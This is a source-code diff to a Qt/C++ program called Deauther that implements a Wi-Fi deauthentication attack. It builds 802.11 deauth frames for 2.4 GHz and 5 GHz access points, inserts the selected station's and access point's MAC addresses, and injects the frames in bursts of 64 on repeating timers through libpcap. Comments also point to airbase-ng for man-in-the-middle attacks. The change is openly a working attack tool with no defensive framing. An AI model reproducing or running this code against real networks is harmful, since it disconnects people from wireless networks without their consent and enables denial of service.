@@ -9,6 +9,7 @@
 #include <NetworkManagerQt/Settings>
 
 #include "deauther.h"
+#include "deauther_p.h"
 #include "ui_deauther.h"
 
 #include "pcap.h"
@@ -45,6 +46,9 @@ Deauther::Deauther(QWidget *parent) :
     connect (search_animation_timer, &QTimer::timeout,
              this, [&]() {search_animation(ui->monitor_status);});
 
+    connect(ui->deauth_attack, &QPushButton::clicked,
+            this, &Deauther::deauther_attack);
+
 
     /* Pseudo Code for Deathor */
 
@@ -74,6 +78,12 @@ Deauther::Deauther(QWidget *parent) :
     // For man-in-the-middle
         // look at airbase-ng
         // https://aircrack-ng.net/doku.php?id=airbase-ng
+}
+
+/* Constructor for private functions */
+Deauther::Deauther (DeautherPrivate &dd)
+    : d_ptr (&dd)
+{
 }
 
 Deauther::~Deauther()
@@ -175,6 +185,7 @@ void Deauther::toggle_monitoring ()
         // avoid blocking pcap thread
         pcap_set_immediate_mode(iface_handle, 1);
         pcap_set_timeout(iface_handle, 500);
+        pcap_setdirection(iface_handle, PCAP_D_INOUT);
 
         // activate new monitor iface
         if (pcap_activate (iface_handle))
@@ -242,14 +253,25 @@ void Deauther::search_animation (QPushButton *button)
 
 void Deauther::deauther_attack ()
 {
+    static bool attack_active = false;
+
+    static QTimer pcap_send_t1;
+    pcap_send_t1.setInterval (1000);
+
+    static QTimer pcap_send_t2;
+    pcap_send_t2.setInterval (900);
+
+    /* Find current row of station view */
     QModelIndex index = ui->station_view->currentIndex();
 
-    if (index.row() == -1)
+    if (index.row() == -1
+        && !attack_active)
     {
         return;
     }
 
-    /* Retrieve currently selected station */
+
+    /* Retrieve selected station */
     if (!station_mutex.tryLock())
     {
         return;
@@ -262,6 +284,7 @@ void Deauther::deauther_attack ()
 
     station_mutex.unlock();
 
+
     /* find ap address */
     bool ap_found = false;
 
@@ -270,17 +293,15 @@ void Deauther::deauther_attack ()
     if (!ap.bssid[0].isNull())
     {
         bssid_2 = ap.bssid[0];
-        chan_2 = ap.channel[0];
 
         ap_found = true;
     }
 
-    QDataStream bssid_5;
+    QByteArray bssid_5;
     int chan_5;
     if (!ap.bssid[1].isNull())
     {
-        bssid_5 << ap.bssid[1];
-        chan_5 = ap.channel[1];
+        bssid_5 = ap.bssid[1];
 
         ap_found = true;
     }
@@ -290,15 +311,207 @@ void Deauther::deauther_attack ()
         return;
     }
 
-    unsigned char deauth_packet[26] = {
-        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-        /*  2 - 3  */ 0x3A, 0x01,                         // duration
-        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
-        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source place holder (station)
-        /* 16 - 21 */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // BSSID place holder (ap)
-        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
-        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
-    };
+
+    /* create deauth packet */
+
+    // 2GHz deauth packet
+    QByteArray packet_2 = QByteArray::fromRawData
+            (reinterpret_cast<const char*>(radiotap_h), 13);
+
+    packet_2.append(reinterpret_cast<const char*>(deauth_packet), 26);
+
+    packet_2.replace(17, 6, bssid_2);
+    packet_2.replace(23, 6, stmac);
+    packet_2.replace(29, 6, bssid_2);
+
+
+    // 5GHz deauth packet
+    QByteArray packet_5 = QByteArray::fromRawData
+            (reinterpret_cast<const char*>(radiotap_h), 13);
+
+    packet_5.append(reinterpret_cast<const char*>(deauth_packet), 26);
+
+    packet_5.replace(17, 6, bssid_5);
+    packet_5.replace(23, 6, stmac);
+    packet_5.replace(29, 6, bssid_5);
+
+
+    QDebug print_pk = qDebug();
+
+    int len = 8;
+    int rem = 0;
+    QString ascii;
+    ascii.resize(len);
+    ascii.fill('.');
+    for (int i=0; i<packet_2.size(); ++i)
+    {
+        if (!(i%len))
+        {
+            QString pos = QString("%1").arg(i, 6, 16, QLatin1Char( '0' ));
+            print_pk << pos.toUtf8().data();
+
+            (packet_2.size() < i+len) ? rem = packet_2.size()-i : rem = len;
+            print_pk << packet_2.sliced(i,rem).toHex(' ').data();
+        }
+
+        if (packet_2.at(i)  > 0x20)
+        {
+            ascii[i%len] = packet_2[i];
+        }
+
+        if (!(((i+1)%len)))
+        {
+            QString align;
+            align.resize (4*(len-rem)-1);
+            align.fill (' ');
+            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;
+
+            ascii.fill('.');
+        }
+        else if (i == packet_2.size() - 1)
+        {
+            QString align;
+            align.resize (4*(len-rem)-1);
+            align.fill (' ');
+            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;
+        }
+    }
+
+    print_pk << Qt::endl;
+
+
+
+    const uchar* pk_data = reinterpret_cast<const uchar*>(packet_2.data());
+    // confirm results of conversion from qbytearray to uchar*
+    len = 8;
+    rem = 0;
+    ascii.resize(len);
+    ascii.fill('.');
+    for (int i=0; i<packet_2.size(); ++i)
+    {
+        if (!(i%len))
+        {
+            QString pos = QString("%1").arg(i, 6, 16, QLatin1Char( '0' ));
+            print_pk << pos.toUtf8().data();
+
+            (packet_2.size() < i+len) ? rem = packet_2.size()-i : rem = len;
+            //print_pk << packet_2.sliced(i,rem).toHex(' ').data();
+        }
+
+        QString byte = QString("%1").arg(quint8(pk_data[i]), 2, 16, QLatin1Char( '0' ));
+        print_pk << byte.toUtf8().data();
+
+        if (packet_2.at(i)  > 0x20)
+        {
+            ascii[i%len] = packet_2[i];
+        }
+
+        if (!(((i+1)%len)))
+        {
+
+            QString align;
+            align.resize (4*(len-rem)-1);
+            align.fill (' ');
+            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;
+
+            ascii.fill('.');
+        }
+        else if (i == packet_2.size() - 1)
+        {
+            QString align;
+            align.resize (4*(len-rem)-1);
+            align.fill (' ');
+            print_pk << align.toUtf8().data() << ascii.toUtf8().data() << Qt::endl;
+        }
+    }
+
+
+    /* send deauth packet */
+    int i = 0;
+    if (!attack_active)
+    {
+        qDebug() << "Start Deauth Attack";
+        qDebug() << Qt::endl;
+        station_model->stop_pcapThread ();
+        ui->toggle_monitoring->setEnabled(false);
+
+
+        if (!bssid_2.isNull())
+        {
+            //int fd_handle = pcap_fileno(iface_handle);
+            connect (&pcap_send_t1, &QTimer::timeout, this, [&, packet_2]
+            {
+                const uchar* pk_data = reinterpret_cast<const uchar*>(packet_2.data());
+                bool sent_packet = false;
+
+                station_mutex.lock();
+                for (int i=0; i<64; ++i)
+                {
+                    if(pcap_inject (this->iface_handle, pk_data, 39) == 0)
+                    {
+                        sent_packet = true;
+                    }
+                }
+
+                if (!sent_packet)
+                {
+                    qWarning() << "Warning: failed to send 2GHz deauth packet";
+                    qWarning() << Qt::endl;
+                }
+                //else { qDebug() << "Packet sent 2GHz" << Qt::endl; }
+                station_mutex.unlock();
+
+                //qDebug() << "sent" << i;
+                //++i;
+            });
+
+            pcap_send_t1.start();
+            attack_active = true;;
+        }
+
+        if (!bssid_5.isNull())
+        {
+            connect (&pcap_send_t2, &QTimer::timeout, this, [&, packet_5]
+            {
+                    const uchar* pk_data = reinterpret_cast<const uchar*>(packet_5.data());
+                    bool sent_packet = false;
+
+                    station_mutex.lock();
+                    for (int i=0; i<64; ++i)
+                    {
+                        if(pcap_inject (this->iface_handle, pk_data, 39) == 0)
+                        {
+                            sent_packet = true;
+                        }
+                    }
+
+                    if (!sent_packet)
+                    {
+                        qWarning() << "Warning: failed to send 5GHz deauth packet";
+                        qWarning() << Qt::endl;
+                    }
+                    //else { qDebug() << "Packet sent 2GHz" << Qt::endl; }
+                    station_mutex.unlock();
+            });
+
+            pcap_send_t2.start();
+            attack_active = true;
+        }
+    }
+    else
+    {
+        qDebug() << "deauth off deactivate";
+        pcap_send_t1.stop();
+        pcap_send_t2.stop();
+
+        disconnect (&pcap_send_t1);
+        disconnect (&pcap_send_t2);
+
+        station_model->start_pcapThread(iface_handle);
+        ui->toggle_monitoring->setEnabled(true);
+
+        attack_active = false;
+    }
 }
 
 
